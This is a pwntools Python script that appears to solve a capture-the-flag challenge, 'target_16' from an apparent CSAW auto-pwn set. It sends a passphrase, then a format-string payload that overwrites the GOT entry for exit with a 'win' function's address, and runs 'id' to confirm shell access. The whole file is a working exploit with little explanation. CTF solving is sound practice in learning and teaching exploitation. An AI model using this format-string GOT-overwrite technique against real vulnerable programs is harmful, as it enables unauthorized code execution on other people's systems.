#!/usr/bin/env python3

from pwn import *
context.update(arch='amd64', os='linux')
exe = context.binary = ELF('./target_16')

#p = remote("auto-pwn.chal.csaw.io", 11016)
p = process('./target_16')
p.recvuntil(b'> ')
p.sendline(b'a60d54c8e22e29052bf16dd854d189ab')
p.recvuntil(b'> ')
p.recvuntil(b'Help! I need to write 60 reports by Sunday afternoon. Give me some content and I will generate a report!!\n')

WIN = exe.functions['win'].address
EXIT = exe.got['exit']

writes = {EXIT: WIN}

payload = fmtstr_payload(6, writes)


p.sendline(payload)
p.recvuntil(b"Thanks! I'll work with the following:\n\n")
p.sendline(b'id')
p.recvline()
print(p.recvline())
#p.interactive()

p.close()
